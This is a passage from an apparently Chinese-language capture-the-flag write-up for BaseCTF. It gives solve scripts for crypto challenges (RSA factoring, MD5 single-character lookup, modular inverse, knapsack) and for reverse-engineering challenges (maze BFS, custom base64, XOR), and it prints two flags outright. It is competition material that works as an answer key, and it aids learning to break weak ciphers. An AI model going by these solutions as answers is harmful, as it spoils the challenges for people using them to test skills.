p 和 q</span><br><span class="hljs-comment"># p*q = n, (p+2)*(q+2) = not_phi</span><br><span class="hljs-comment"># 展开得到 pq + 2p + 2q + 4 = not_phi</span><br><span class="hljs-comment"># p + q = (not_phi - n - 4) / 2</span><br><br>s = (not_phi - n - <span class="hljs-number">4</span>) // <span class="hljs-number">2</span><br><span class="hljs-comment"># 使用求解二次方程的方法解出 p 和 q</span><br><span class="hljs-comment"># x^2 - sx + n = 0</span><br>discriminant = gmpy2.isqrt(s*s - <span class="hljs-number">4</span>*n)<br>p = (s + discriminant) // <span class="hljs-number">2</span><br>q = (s - discriminant) // <span class="hljs-number">2</span><br><br><span class="hljs-comment"># Step 2: 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Step 3: 计算私钥 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># Step 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># Step 5: 将解密的数字转换为字符串</span><br>decrypted_message = long_to_bytes(m)<br><br><span class="hljs-comment"># 打印解密后的数据</span><br><span class="hljs-built_in">print</span>(decrypted_message)<br></code></pre></td></tr></table></figure><h3 id="你会算md5吗"><a href="#你会算md5吗" class="headerlink" title="你会算md5吗"></a>你会算md5吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># Helper function to compute MD5 hash of a string</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-comment"># Possible characters</span><br>possible_chars = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?/&quot;</span><br><br><span class="hljs-comment"># Given hashes</span><br>hashes = [<br>    <span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>,<br>    <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>,<br>    <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>,<br>    <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>,<br>    <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>,<br>    <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>,<br>    <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>,<br>    <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>,<br>    <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span><br>]<br><br><span class="hljs-comment"># Find corresponding characters</span><br>decoded_flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> hash_val <span class="hljs-keyword">in</span> hashes:<br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> possible_chars:<br>        <span class="hljs-keyword">if</span> md5_hash(char) == hash_val:<br>            decoded_flag += char<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        decoded_flag += <span class="hljs-string">&#x27;?&#x27;</span>  <span class="hljs-comment"># Use a placeholder if hash not found</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded flag: <span class="hljs-subst">&#123;decoded_flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="十七倍"><a href="#十七倍" class="headerlink" title="十七倍"></a>十七倍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[] = &#123;<br>        <span class="hljs-number">98</span>, <span class="hljs-number">113</span>, <span class="hljs-number">163</span>, <span class="hljs-number">181</span>, <span class="hljs-number">115</span>, <span class="hljs-number">148</span>, <span class="hljs-number">166</span>, <span class="hljs-number">43</span>, <span class="hljs-number">9</span>, <span class="hljs-number">95</span>,<br>        <span class="hljs-number">165</span>, <span class="hljs-number">146</span>, <span class="hljs-number">79</span>, <span class="hljs-number">115</span>, <span class="hljs-number">146</span>, <span class="hljs-number">233</span>, <span class="hljs-number">112</span>, <span class="hljs-number">180</span>, <span class="hljs-number">48</span>, <span class="hljs-number">79</span>,<br>        <span class="hljs-number">65</span>, <span class="hljs-number">181</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">46</span>, <span class="hljs-number">249</span>, <span class="hljs-number">78</span>, <span class="hljs-number">183</span>, <span class="hljs-number">79</span>, <span class="hljs-number">133</span>,<br>        <span class="hljs-number">180</span>, <span class="hljs-number">113</span>, <span class="hljs-number">146</span>, <span class="hljs-number">148</span>, <span class="hljs-number">163</span>, <span class="hljs-number">79</span>, <span class="hljs-number">78</span>, <span class="hljs-number">48</span>, <span class="hljs-number">231</span>, <span class="hljs-number">77</span><br>    &#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[<span class="hljs-number">40</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> inverse = <span class="hljs-number">241</span>;  <span class="hljs-comment">// 17&#x27;s modular inverse modulo 256</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        flag[i] = (cipher[i] * inverse) % <span class="hljs-number">256</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Print the decrypted flag</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Decrypted flag: &quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, flag[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="babypack"><a href="#babypack" class="headerlink" title="babypack"></a>babypack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 从文件中读取a和c的值</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;D:\\谷歌\\babypack\\output.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    a = <span class="hljs-built_in">eval</span>(lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br>    c = <span class="hljs-built_in">int</span>(lines[<span class="hljs-number">1</span>].strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])<br><br>bin_m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> c &gt;= a[i]:<br>        bin_m.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        c -= a[i]<br>    <span class="hljs-keyword">else</span>:<br>        bin_m.append(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><span class="hljs-comment"># 将bin_m转换回整数m</span><br>m = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(bin_m), <span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 将m转换回flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><p>按照shift和f12进行查找最后拼接就行了</p><p><strong>BaseCTF{Y0u_4Re_900d_47_id4}</strong></p><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ&#x3D;&#x3D;</p><p>base64解密</p><p><strong>BaseCTF{Hav3_@_g0od_t1m3!!!}</strong></p><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">maze, start_pos, end_pos</span>):<br>    ROWS = <span class="hljs-built_in">len</span>(maze)<br>    COLS = <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>])<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">pos, direction</span>):<br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;d&#x27;</span>:  <span class="hljs-comment"># Right</span><br>            <span class="hljs-keyword">return</span> pos + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;s&#x27;</span>:  <span class="hljs-comment"># Down</span><br>            <span class="hljs-keyword">return</span> pos + COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;w&#x27;</span>:  <span class="hljs-comment"># Up</span><br>            <span class="hljs-keyword">return</span> pos - COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;a&#x27;</span>:  <span class="hljs-comment"># Left</span><br>            <span class="hljs-keyword">return</span> pos - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> pos<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">pos</span>):<br>        <span class="hljs-keyword">if</span> pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= ROWS * COLS:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">return</span> maze[x][y] != <span class="hljs-string">&#x27;$&#x27;</span><br>    <br>    queue = deque([(start_pos, <span class="hljs-string">&#x27;&#x27;</span>)])<br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start_pos)<br><br>    <span class="hljs-keyword">while</span> queue:<br>        current_pos, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> current_pos == end_pos:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-keyword">for</span> direction <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dsaw&#x27;</span>:<br>            new_pos = move(current_pos, direction)<br>            <span class="hljs-keyword">if</span> is_valid(new_pos) <span class="hljs-keyword">and</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(new_pos)<br>                queue.append((new_pos, path + direction))<br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 迷宫初始化</span><br>maze = [<br>    <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>]<br><br><span class="hljs-comment"># 将迷宫数据转换为一维列表</span><br>ROWS = <span class="hljs-number">15</span><br>COLS = <span class="hljs-number">15</span><br>maze_1d = <span class="hljs-string">&#x27;&#x27;</span>.join(maze)<br><br><span class="hljs-comment"># 起点和终点</span><br>START = <span class="hljs-number">0</span><br>END = (ROWS - <span class="hljs-number">1</span>) * COLS + (COLS - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 最后一行最后一列的位置</span><br><br><span class="hljs-comment"># 查找路径</span><br>path = find_path([maze_1d[i * COLS:(i + <span class="hljs-number">1</span>) * COLS] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROWS)], START, END)<br><span class="hljs-keyword">if</span> path:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到的路径：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有找到路径&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后进行MD5加密就行</p><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Secret array used in encoding</span><br>Secret = <span class="hljs-string">&#x27;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_str</span>):<br>    decoded_str = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># Step 1: XOR each character with 0xE to undo the XOR applied during encoding</span><br>    xor_str = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(char) ^ <span class="hljs-number">0xE</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> encoded_str)<br><br>    <span class="hljs-comment"># Process the string in chunks of 4 characters</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor_str), <span class="hljs-number">4</span>):<br>        enc_chunk = xor_str[i:i+<span class="hljs-number">4</span>]<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Reverse the Base64-like encoding using the Secret array</span><br>            v15 = (Secret.index(enc_chunk[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">2</span>) | (Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &gt;&gt; <span class="hljs-number">4</span>)<br>            v16 = ((Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xF</span>) &lt;&lt; <span class="hljs-number">4</span>) | (Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &gt;&gt; <span class="hljs-number">2</span>)<br>            v17 = ((Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">6</span>) | Secret.index(enc_chunk[<span class="hljs-number">3</span>])<br><br>            <span class="hljs-comment"># Reconstruct the original characters</span><br>            decoded_str += <span class="hljs-built_in">chr</span>(v15)<br>            <span class="hljs-keyword">if</span> v16 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v16)<br>            <span class="hljs-keyword">if</span> v17 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v17)<br><br>        <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error processing chunk: <span class="hljs-subst">&#123;enc_chunk&#125;</span> - <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">return</span> decoded_str<br><br><span class="hljs-comment"># Example usage</span><br>encoded_str = <span class="hljs-string">&quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br>decoded_str = decode(encoded_str)<br><br><span class="hljs-keyword">if</span> decoded_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded string: <span class="hljs-subst">&#123;decoded_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoding failed due to an error.&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成与输入数据长度相同的key stream&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_decrypt</span>(<span class="hljs-params">data, key_stream</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;对数据进行加密/解密操作&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data[i] ^ key_stream[<span class="hljs-built_in">len</span>(data) - i - <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt_decryption</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尝试用给定的key解密数据&quot;&quot;&quot;</span><br>    key_stream_data = key_stream(key, <span class="hljs-built_in">len</span>(encrypted_data))<br>    decrypted = encrypt_decrypt(encrypted_data, key_stream_data)<br><br>    <span class="hljs-keyword">try</span>:<br>        flag = decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;Base&quot;</span>):<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;可能的flag&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;解密结果&quot;</span><br>    <span 